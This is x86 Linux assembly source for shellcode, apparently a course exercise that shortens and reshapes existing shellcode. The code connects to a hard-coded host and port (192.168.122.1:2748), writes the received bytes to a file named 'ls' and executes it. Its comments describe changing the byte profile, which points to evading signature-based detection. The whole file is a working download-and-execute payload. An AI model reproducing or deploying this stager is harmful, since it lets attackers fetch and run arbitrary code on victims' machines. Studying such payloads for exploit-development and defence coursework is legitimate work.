global _start
_start:

;-----------------------
; initialize with socket
;    xor  ecx, ecx
;    mul  ecx
;    xor  ebx, ebx
;    cdq
;
    ;socket
;    push eax
;    push byte 0x1
;    push byte 0x2
;    mov  ecx, esp
;    inc  ebx
;    mov  al, 0x66
;    int  0x80
;    mov  edi, eax         ;edi=sockfd
; replace with initialization and socket creation with
; same section from Assignment 1; shorter by 2 bytes
    xor ebx, ebx
    mul ebx
    push byte 0x66
    pop eax
    inc ebx
    push edx
    push ebx
    push byte 0x2
    mov ecx, esp
    int 0x80
    xchg edi, eax
;-----------------------

;---------------------
; port connect section
    ;connect,port(2748)=0abc ip(192.168.122.1)=(c0.a8.7a.01)  
    ; changed port from 9999 to 2748
;    push edx    <------unnecessary instruction
;    push long 0x017aa8c0  ;address *
;    push word 0xbc0a      ;port    * 
;    mov  dl, 0x02                       <---these instructions
;    push dx               ;family  1    <---replaced with one push
;    mov  ecx, esp         ;adjust struct
;    push byte 0x10
;    push ecx   
;    push edi              ;sockfd
;    mov  ecx, esp
;    mov   bl, 0x03
;    mov   al, 0x66
;    int  0x80
; changed order of instructions; consolidated two instructions
; into one; removed a one-byte instruction; shorter by 2 bytes
    mov bl, 0x3
    mov al, 0x66
    push dword 0x017aa8c0
    push word 0xbc0a
    push word 0x2
    mov ecx, esp
    push byte 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80
;---------------------

;-------------------------------------------------
; file opening section for writing transfered data
    ; sys_open(ls,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)
    ; changed filename from "cb" to "ls"
;    xor  ebx, ebx  ;<-- unnecessary zeroing out
;    xor  ecx, ecx
;    push ecx       ;<-- use eax to push null to top of stack instead
;    push word 0x736C      ;file name="ls"
;    mov  ebx, esp
;    mov   cx, 0x0242
;    mov   dx, 0x01c0      ;octal
;    mov   al, 0x05
;    int  0x80
;    mov  esi, eax         ;esi=fd
; removed one unnecessary instruction; modified one instruction
; shorter by 2 bytes
    xor  ecx, ecx
    push eax
    push word 0x736c
    mov  ebx, esp
    push word 0x0242
    pop  cx
    mov  dx, 0x01c0
    mov  al, 0x05
    int  0x80
    mov  esi, eax
;-------------------------------------------------

;------------------------------
; read/write of transfered file
;    xor  ecx, ecx
;    mul  ecx
;    cdq
;    mov   dx, 0x03e8      ;memory chunk=1000=0x03e8: read per time
;
;L1:                         
    ;sys_read(socket sockfd,buf,len)
;    xor  ebx, ebx
;    xor  eax, eax
;    mov   al, 0x03
;    mov  ebx, edi         ;edi=sock fd
;    lea  ecx,[esp-0x3e8]  ;memory chunk
;    int  0x80
    ;sys_write(fd,*buf,count)
;    mov  ebx, esi
;    mov  edx, eax
;    xor  eax, eax
;    mov   al, 0x04
;    int  0x80
;    cmp   dx, 0x03e8
;    je L1                 ;loop
; replaced the first four lines with one mov instructions using
; a value in a register that would otherwise be discarded; shorter
; by 7 bytes
    mov edx, ecx   ; makes memory chunk 0x242
L1:                         
    ;sys_read(socket sockfd,buf,len)
    xor  ebx, ebx
    xor  eax, eax
    mov   al, 0x03
    mov  ebx, edi
    lea  ecx,[esp-0x242]
    int  0x80
    ;sys_write(fd,*buf,count)
    mov  ebx, esi
    mov  edx, eax
    xor  eax, eax
    mov   al, 0x04
    int  0x80
    cmp   dx, 0x242
    je L1
;------------------------------

;-------------------
; close file section
    ;sys_close(fd)
;    mov  ebx,esi
;    xor  eax,eax
;    mov  al,0x6
;    int  0x80
; about as short and simple as it can get; just switched
; the first two instructions
    xor  eax,eax
    mov  ebx,esi
    mov  al,0x6
    int  0x80
;-------------------

;-------------------------------------
; execution of downloaded file section
    ; execve[./ls,0]
    ; changed filename from "cb" to "ls"
;    xor  ecx,ecx   ;<-- eax is zero here, so zero out with mov
;    mul  ecx       ;<-- not necessary
;    push ecx       ;<-- change to eax
;    push word 0x736C      ; file name="ls"
;    mov  ebx,esp
;    push ecx       ;<-- change to eax
;    push ebx
;    mov  ecx,esp
;    mov  al,0x0b
;    int  0x80
; changed the zeroing methode for ecx; changed two push instructions
; to alter the byte profile a little; 2 bytes shorter
    mov  edx, eax
    push eax
    push word 0x736c
    mov  ebx,esp
    push eax
    push ebx
    mov  ecx,esp
    mov  al,0x0b
    int  0x80
;-------------------------------------

;----------------
; exiting section
    ; exit cleanly
;    xor  eax,eax
;    xor  ebx,ebx
;    inc  eax
;    int  0x80
; in the context of shellcode, there is really no reason to
; set the exit code to a sane value; removed the zeroing out
; of ebx to shorten this section by 2 bytes
    xor  eax,eax
    inc  eax
    int  0x80
;----------------

